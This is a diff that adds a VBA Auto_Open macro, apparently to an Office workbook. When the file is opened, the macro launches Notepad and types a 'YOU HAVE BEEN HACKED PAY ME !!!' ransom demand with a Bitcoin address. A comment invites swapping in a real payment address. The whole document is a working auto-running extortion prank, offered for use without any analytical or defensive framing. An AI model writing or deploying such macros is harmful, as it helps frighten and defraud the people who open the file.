@@ -1,0 +1,20 @@
+Sub Auto_Open()
+    Dim shell As Object
+    Dim bitcoinAddress As String
+    
+    ' Example Bitcoin address, replace with a real or dynamically generated one as needed
+    bitcoinAddress = "1BoatSLRHtKNngkdXEeobR76b53LETtpyT"
+    
+    Set shell = CreateObject("WScript.Shell")
+    
+    ' Start notepad
+    shell.Run "notepad.exe"
+    Application.Wait Now + TimeValue("0:00:02") ' Wait for Notepad to open
+    
+    ' Bring Notepad to the foreground
+    shell.AppActivate "Notepad"
+    Application.Wait Now + TimeValue("0:00:01") ' Wait a bit for app activation
+    
+    ' Send the message to Notepad
+    shell.SendKeys "YOU HAVE BEEN HACKED PAY ME !!!" & vbCrLf & "Bitcoin Address: " & bitcoinAddress, True
+End Sub
